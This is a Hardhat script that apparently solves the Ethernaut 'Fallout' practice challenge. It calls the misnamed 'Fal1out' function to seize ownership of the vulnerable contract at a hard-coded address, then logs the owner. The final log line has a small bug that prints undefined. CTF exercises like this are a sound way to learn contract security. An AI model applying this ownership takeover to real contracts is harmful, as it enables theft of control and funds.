const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config();

async function main() {
  const provider = new ethers.providers.JsonRpcBatchProvider(
    process.env.ALCHEMY_URL
  );
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const contractAddress = "0xB56eF1f432B26CAbAE3127CeFe2AB36cFA280531";
  const contract = await ethers.getContractAt(
    "Fallout",
    contractAddress,
    wallet
  );

  const Fal1out = await contract.Fal1out({
    value: ethers.utils.parseEther("0.001"),
  });
  console.log("Fal1out called at hash: ", Fal1out.hash);

  const owner = await contract.owner();
  console.log("owner address: ", owner.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
